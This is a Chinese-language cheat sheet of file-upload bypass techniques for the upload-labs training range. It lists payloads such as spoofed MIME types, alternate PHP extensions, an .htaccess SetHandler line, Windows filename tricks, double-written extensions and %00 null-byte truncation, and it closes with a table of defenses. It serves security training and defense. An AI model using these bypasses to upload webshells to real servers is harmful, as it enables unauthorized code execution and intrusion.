# 文件上传绕过速查

一页汇总 upload-labs 常见上传绕过手法。

> [!warning] 合规声明
> 仅在授权目标或本地靶场上使用。

## 总表

| 关卡 | 手法 | 平台 | 校验类型 | 绕过 payload / 操作 |
|------|------|------|---------|-------------------|
| Pass-01 | 前端绕过 | 通用 | 浏览器 JS 校验扩展名 | 抓包改 `filename="shell.php"` |
| Pass-02 | MIME 绕过 | 通用 | 服务端检查 `Content-Type` | 改为 `Content-Type: image/png` |
| Pass-03 | 特殊扩展名 | Linux | 黑名单 `.php` 等 | `.phtml`、`.php5`、`.pht`、`.shtml` |
| Pass-04 | .htaccess | Apache | 黑名单缺 `.htaccess` | 上传 `.htaccess`：`SetHandler application/x-httpd-php`，再传 `shell.ppp` |
| Pass-06 | 大小写 | Linux | 未统一大小写 | `shell.phP` |
| Pass-07 | 尾部空格 | Windows | 未去首尾空格 | `shell.php `（末尾加空格） |
| Pass-08 | 尾部点号 | Windows | 未去末尾点 | `shell.php.` |
| Pass-09 | `::$DATA` | Windows | 未检测 NTFS 数据流 | `shell.php::$DATA` |
| Pass-10 | 点 + 空格 + 点 | Windows | `deldot()` 遇空格停止 | `shell.php. .` |
| Pass-11 | 双写 | 通用 | `str_ireplace` 只替换一次 | `shell.pphphp` → `shell.php` |
| Pass-12 | 00 截断 GET | Windows | PHP < 5.3.4 | `save_path=../upload/shell.php%00` |
| Pass-13 | 00 截断 POST | Windows | PHP < 5.3.4 | `../upload/a.php%00.png` |

## 特殊扩展名

```text
php  php2  php3  php4  php5  php6  php7
pht  phtml  shtml  pwml  phtm
```

对应正则：`/ph(p[2-7]?|t(ml)?)/`

## .htaccess

```apache
SetHandler application/x-httpd-php
```

上传后，同目录下任意扩展名文件都会被当作 PHP 解析。

## Windows 文件名特性

| 特性 | 输入 | 实际效果 |
|------|------|---------|
| 尾部空格被去除 | `shell.php ` | `shell.php` |
| 尾部点被去除 | `shell.php.` | `shell.php` |
| NTFS 数据流 | `shell.php::$DATA` | 等价于 `shell.php` |
| deldot 遇空格停止 | `shell.php. .` | 绕过删除 |

## 双写

```text
shell.pphphp  --替换一次 "php"-->  shell.php
```

> [!warning] 不要写成 `phphpp`，替换后变成 `hpp`。

## 00 截断条件

| 条件 | 值 |
|------|-----|
| PHP 版本 | < 5.3.4 |
| `magic_quotes_gpc` | Off |
| 插入方式 | URL `%00` 或原始字节 `0x00` |

## 防御

| 措施 | 说明 |
|------|------|
| 白名单 | 只允许业务扩展名 |
| 服务端校验 | 不信任前端与 `Content-Type` |
| 内容检测 | 文件头 / 魔数 / 二次渲染 |
| 重命名 | 随机文件名，用户不可控 |
| 禁止执行 | 上传目录关闭脚本解析 |
| 禁用 .htaccess | Apache `AllowOverride None` |
| 路径校验 | 禁止目录穿越与空字节 |
